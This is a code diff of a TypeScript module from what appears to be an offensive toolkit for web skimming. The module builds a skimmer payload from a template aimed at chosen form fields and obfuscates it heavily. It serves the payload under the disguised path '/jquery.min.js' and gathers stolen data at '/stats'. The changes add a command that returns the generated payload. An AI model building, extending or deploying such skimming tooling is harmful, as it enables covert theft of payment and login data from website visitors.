@@ -1,8 +1,10 @@
 import * as fs from "fs";
-import * as jsObfuscator from "javascript-obfuscator";
+import { obfuscate, ObfuscationResult } from "javascript-obfuscator";
 
 import { Constants, emsg } from "../utils/utils";
 import BaseModule from "./base";
+
+const MODULE_DESCRIPTION = "manage the skimmer configuration";
 
 const SKIMMER_PAYLOAD_TEMPLATE_PATH = "payloads/skimmer.js";
 
@@ -21,6 +23,8 @@ export default class SkimmerModule extends BaseModule {
     constructor(protected configFile) {
         super("skimmer", configFile);
 
+        this.description = MODULE_DESCRIPTION;
+
         this.config = {
             payload_route: "/jquery.min.js",
             data_route: "/stats",
@@ -35,6 +39,13 @@ export default class SkimmerModule extends BaseModule {
                 arguments: [],
                 description: "generate skimmer payload with the specified url and target classes and ids",
                 execute: this.run,
+            },
+            payload: {
+                arguments: [],
+                description: "get the current generated payload",
+                execute: () => {
+                    return { message: this.payload };
+                },
             },
             "set url": {
                 arguments: ["<url>"],
@@ -98,9 +109,9 @@ export default class SkimmerModule extends BaseModule {
         skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
         skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");
 
-        let obfs: jsObfuscator.ObfuscationResult;
+        let obfs: ObfuscationResult;
         try {
-            obfs = jsObfuscator.obfuscate(skimmerJs, {
+            obfs = obfuscate(skimmerJs, {
                 compact: true,
                 controlFlowFlattening: true,
                 transformObjectKeys: true,
